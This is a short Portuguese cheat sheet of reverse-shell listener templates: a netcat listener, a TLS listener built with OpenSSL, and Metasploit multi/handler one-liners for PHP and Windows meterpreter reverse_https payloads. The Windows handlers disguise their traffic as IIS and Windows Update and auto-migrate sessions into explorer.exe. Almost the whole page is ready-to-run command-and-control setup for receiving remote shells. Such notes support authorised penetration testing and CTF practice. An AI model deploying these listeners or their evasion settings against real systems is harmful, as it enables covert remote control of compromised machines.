---
title: "Listeners"
---

# Listeners

Templates de listeners para receber conexões reversas. Inclui netcat simples, OpenSSL com TLS e Metasploit multi/handler para payloads PHP, 32-bit e 64-bit HTTPS com migração automática de processo.

```shell
# Netcat com rlwrap (histórico de comandos)
rlwrap -cAra nc -vnlp 443

# OpenSSL — gerar certificado e iniciar listener TLS
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port 443

# Metasploit — PHP
sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD php/meterpreter/reverse_tcp; set LHOST 192.168.45.184; set LPORT 443; exploit"

# Metasploit — Windows 32-bit HTTPS
msfconsole -q -x "use exploit/multi/handler ; set PAYLOAD windows/meterpreter/reverse_https ; set LHOST eth0 ; set LPORT 443 ; set EXITFUNC thread; set ExitOnSession false ; set EnableStageEncoding true ; set EnableUnicodeEncoding true ; set HandlerSSLCert '/home/kali/.msf4/loot/20230709214031_default_20.53.203.50_20.53.203.50_pem_128569.pem' ; set HttpServerName 'IIS' ; set HttpUnknownRequestResponse 'Windows Update' ; set HttpUserAgent 'Windows-Update-Agent/10.0.10011.16384' ; set AutoRunScript migrate -n explorer.exe ; run"

# Metasploit — Windows 64-bit HTTPS
msfconsole -q -x "use exploit/multi/handler ; set PAYLOAD windows/x64/meterpreter/reverse_https ; set LHOST eth0 ; set LPORT 443 ; set HttpServerName 'IIS' ; set HttpUnknownRequestResponse 'Windows Update' ; set HttpUserAgent 'Windows-Update-Agent/10.0.10011.16384' ; set AutoRunScript migrate -n explorer.exe ; run"
```
